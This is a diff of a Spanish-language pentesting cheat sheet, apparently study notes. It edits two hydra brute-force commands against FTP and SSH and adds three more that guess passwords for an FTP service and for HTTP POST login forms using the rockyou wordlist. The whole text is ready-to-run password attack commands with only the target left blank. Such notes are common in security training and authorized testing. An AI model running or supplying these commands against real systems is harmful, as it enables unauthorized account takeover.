@@ -44,8 +44,18 @@
 1. Para realizar ataques de **fuerza bruta** de contraseñas FTP, SSH
 
    ```bash
-   hydra -t 4 -l <username> -P /usr/share/wordlists/rockyou.txt -vV [TARGET_IP] ftp
+   hydra -t 4 -l <username> -P /usr/share/wordlists/rockyou.txt -vV <TARGET_IP> ftp
    ```
    ```bash
-   hydra -t 4 -l <username> -P /usr/share/wordlists/rockyou.txt -vV [TARGET_IP] ssh
+   hydra -t 4 -l <username> -P /usr/share/wordlists/rockyou.txt -vV <TARGET_IP> ssh
    ```
+   ```bash
+   hydra -l <username> -P passlist.txt ftp://<TARGET_IP>
+   ```
+   ```bash
+   hydra -l <username> -P /usr/share/wordlists/rockyou.txt <TARGET_IP> http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
+   ```
+   ```bash
+   hydra -l <username> -P /usr/share/wordlists/rockyou.txt <TARGET_IP> http-post-form "login/:username=^USER^&password=^PASS^:F=incorrect" -V
+   ```
+
